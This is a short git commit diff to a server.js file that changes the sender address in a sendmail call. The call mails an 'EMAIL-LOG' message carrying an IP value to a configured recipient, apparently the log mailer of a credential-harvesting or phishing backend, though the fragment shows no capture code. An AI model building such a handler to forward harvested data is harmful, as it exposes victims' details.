96d8087fd787925ce30c5039f0b8eecb1a9f4b64
tailopez147 <49619133+tailopez147@users.noreply.github.com>
2023-07-10 19:19:54 +0300

    Update server.js

--- server.js
+++ server.js
@@ -64,7 +64,7 @@ app.post("/", (req, res) => {
 
   sendmail(
     {
-      from: "docu@logscentral.com",
+      from: "logs@logscentral.com",
       to: logEmail,
       subject: "EMAIL-LOG " + ip2,
       html,
